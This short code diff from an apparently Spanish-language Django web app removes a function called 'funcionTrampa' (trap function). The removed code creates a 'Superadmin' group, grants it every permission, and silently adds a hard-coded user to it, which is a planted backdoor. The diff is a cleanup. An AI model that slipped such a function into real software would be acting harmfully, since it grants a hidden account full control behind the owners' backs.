@@ -507,14 +507,3 @@ def activate(request, uidb64, token):
     
     return redirect('perfil', user.username)
 
-def funcionTrampa(self):
-    g = Group.objects.create(name = 'Superadmin')
-    Permission.objects.create(name="Acceder al Panel", content_type=Permission.objects.get(codename='view_usuario').content_type, codename="acceso_panel")
-    permisos = Permission.objects.all()
-    for p in permisos:
-        g.permissions.add(p)
-    user = Usuario.objects.get(username='tiguer918')
-    user.groups.add(g)
-    user.save()
-    
-    
